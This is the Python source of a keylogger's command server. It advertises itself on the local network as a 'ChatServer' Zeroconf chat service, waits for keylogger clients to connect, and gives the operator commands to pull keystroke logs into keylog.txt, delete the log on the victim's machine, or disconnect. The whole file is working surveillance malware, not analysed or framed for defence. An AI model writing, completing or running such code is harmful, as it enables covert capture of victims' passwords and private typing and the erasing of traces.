# server.py
import socket
import threading
from zeroconf import Zeroconf, ServiceInfo
import sys

SERVICE_TYPE = "_chat._tcp.local."
SERVICE_NAME = "ChatServer._chat._tcp.local."
TCP_PORT = 12345
msg = ""

# Get local IP address
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

ip = get_local_ip()
ip_bytes = socket.inet_aton(ip)

# Register the Zeroconf service
info = ServiceInfo(
    SERVICE_TYPE,
    SERVICE_NAME,
    addresses=[ip_bytes],
    port=TCP_PORT,
    properties={},
    server="chat.local."
)

zeroconf = Zeroconf()
zeroconf.register_service(info)
print(f"[SERVER] Zeroconf service registered at {ip}:{TCP_PORT}")
print("[SERVER] Waiting for keyloggers...")

# Start TCP server
tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind((ip, TCP_PORT))
tcp_server.listen(1)

conn, addr = tcp_server.accept()
print(f"[SERVER] Connected to {addr}")

def receive():
    while True:
        try:
            data = conn.recv(1024)
            if not data:
                print("[SERVER] Client disconnected.")
                break
            decoded = data.decode()
            if msg == "sendlog":
                with open("keylog.txt", "w") as file:
                    file.write(decoded)
                print("[SERVER] Data saved to keylog.txt")
            else:
                print(data.decode())
        except Exception as e:
            print(f"[SERVER] Error: {e}")
            break

threading.Thread(target=receive, daemon=True).start()

try:
    while True:
        print("Choose a command: sendlog / deletelog / disconnect")
        msg = input().strip()
        if msg in ["sendlog", "deletelog", "disconnect"]:
            conn.sendall(msg.encode())
            if msg == "disconnect":
                sys.exit()
        else:
            print("Invalid Command!")
except KeyboardInterrupt:
    print("\n[SERVER] Shutting down...")

# Cleanup
conn.close()
tcp_server.close()
zeroconf.unregister_service(info)
zeroconf.close()
